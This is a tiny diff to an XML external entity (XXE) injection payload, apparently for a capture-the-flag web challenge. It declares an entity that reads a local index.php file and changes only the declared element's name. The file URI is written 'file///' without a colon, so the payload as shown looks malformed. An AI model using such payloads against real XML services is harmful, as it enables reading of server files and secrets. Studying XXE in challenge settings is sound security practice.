@@ -1,5 +1,5 @@
   <!DOCTYPE foo [
-  <!ELEMENT xxe ANY>
+  <!ELEMENT foo ANY>
   <!ENTITY xxe SYSTEM "file///challenge/web-serveur/ch29/index.php">
   ]
 >
